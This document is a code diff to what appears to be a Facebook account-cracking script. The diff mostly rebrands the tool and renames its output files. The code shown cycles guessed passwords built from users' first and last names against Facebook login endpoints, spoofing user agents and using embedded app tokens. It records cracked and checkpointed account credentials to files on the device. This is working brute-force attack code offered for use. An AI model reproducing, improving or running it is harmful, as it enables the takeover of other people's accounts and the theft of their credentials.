@@ -218,20 +218,20 @@ Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/
 Mozilla/5.0 (Linux; Android 10; SM-A125F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
 Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36;]
-Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1;]
-Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36;]
-Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1;]
-Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1;]
-Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1;]
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1;]
-Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4;]
-Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36;]
-Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 PHX/10.0;]
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:95.75.4.89]
+Mozilla/5.0 (Windows NT 6.0; rv:108.0) Gecko/20100101 Firefox/108.0
+Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 13; SM-G780F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]
+Mozilla/5.0 (Linux; Android 11; 2201116TG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 12; V2023 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (Linux; Android 11; SM-A035M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
+Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1;]
+Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15;]
 Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]
 Mozilla/5.0 (Linux; U; Android 12; zh-CN; Infinix X677 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 HiBrowser/v2.6.3.1 UWS/ Mobile Safari/537.36;]
 Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
 Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]
-facebookexternalhit/1.1 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36;]
+Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1;]
 Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36;]
 
 """
@@ -266,7 +266,7 @@ def method():
     print(logo) 
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait Nd See ")
-    print(f"{oo('•')}//sdcard/Live-OK.txt")
+    print(f"{oo('•')}//sdcard/R4FS-FILE-OK.txt")
     print(f"\x1b[1;97m__________________________________________________")
     print()
     
@@ -290,7 +290,7 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            response = r.post('x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
@@ -332,7 +332,7 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mGZM-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mR4FSAN-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
@@ -340,11 +340,11 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            response = r.post('x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;33m[\033[1;33mLIVE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
-                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;33m[\033[1;33mR4FSAN-FILE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
+                open('//sdcard/R4FSAN-FILE-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -360,9 +360,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;35m[\033[1;35mLIVE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword)
+                     print('\r\033[1;35m[\033[1;35mR4FSAN-FILE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/R4FSAN-FILE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -414,7 +414,7 @@ def andom():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}//sdcard/Live-OK.txt")
+    print(f"{oo('•')}//sdcard/R4FSAN-FILE-OK.txt")
     print('\033[1;93m='*25)
     print()    
     def start(user):
@@ -441,8 +441,8 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mLIVE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mR4FSAN-FILE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('//sdcard/R4FSAN-FILE-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -455,9 +455,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mLIVRE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mR4FSAN-FILE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/R4FSAN-FILE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -491,8 +491,8 @@ def andom():
             response = r.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1', cookies=cookies, headers=headers)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mLIVE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mR4FSAN-FILE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('//sdcard/R4FSAN-FILE-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -508,9 +508,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mLIVRE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mR4FSAN-FILE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/R4FSAN-FILE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
